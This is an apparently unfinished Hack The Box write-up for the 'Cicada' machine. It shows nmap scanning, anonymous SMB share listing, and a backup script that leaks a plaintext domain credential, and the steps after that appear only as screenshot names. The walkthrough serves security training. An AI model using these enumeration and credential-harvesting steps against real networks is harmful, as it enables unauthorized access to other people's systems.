---
title: "Cicada - Hack The Box Machines"
date: 2024-10-30 08:00:00 - 0500
categories: [Hack The Box, Machines]
tags: [htb, machine, linux, easy]
image: 
  path: /assets/img/posts/htb/htb.png
---


## Reconnaisance

Hello and welcome back to noob in cybersecurity and today I will show you the way that I solved the Cicada challenge on Hack The Box

To start tackling the Cicada challenge on Hack The Box, I will focus on reconnaissance and initial footprinting using tools like Nmap. This initial phase sets the foundation for  a successful hack by providing insights into the target’s infrastructure and possible weak points.

```bash
yzx@machine:~/workspace/hackthebox$ nmap -p- $cicada -T4 --min-rate=2000 -oN cicada/scan -Pn --disable-arp-ping
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-31 11:26 EDT
Nmap scan report for 10.x.x.x
Host is up (0.13s latency).
Not shown: 65522 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
57635/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 98.66 seconds
```
{: .nolineno }

```bash
echo '10.10.x.x cicada.htb' | sudo tee -a /etc/hosts
```
{: .nolineno }

From the  results of the Nmap scan, we can see that the SMB (Server Message Block) share is enabled, which can reveal valuable information when properly explored. To connect to an SMB share, I often use tools like smbclient . To begin the process, I used a command like smbclient -L //cicada.htb -U 'guest' to list available shares. 

```bash
yzx@machine:~/workspace/hackthebox$ smbclient -L //cicada.htb
Password for [WORKGROUP\yzx]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
{: .nolineno }

We can see some sharename such as: `DEV` , `HR`, etc … 

Upon further exploration of the HR directory, I discovered that there is a file named `Notice from HR.txt` , and to find out the content of this file is, I opened it.

![](/assets/img/posts/htb/cicada/Screenshot from 2024-10-31 12-14-18.png){: width="972" height="589" }

![](/assets/img/posts/htb/cicada/smbclient list share.png){: width="972" height="589" }

![](/assets/img/posts/htb/cicada/smbclient HR dir.png){: width="972" height="589" }

![](/assets/img/posts/htb/cicada/crackmapexec.png){: width="972" height="589" }

![](/assets/img/posts/htb/cicada/crackmapexec%20with%20default%20password.png){: width="972" height="589" }

![](/assets/img/posts/htb/cicada/enum.png){: width="972" height="589" }

![](/assets/img/posts/htb/cicada/image%206.png){: width="972" height="589" }

![](/assets/img/posts/htb/cicada/smb%20david.png){: width="972" height="589" }

```ps1
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
{: .nolineno }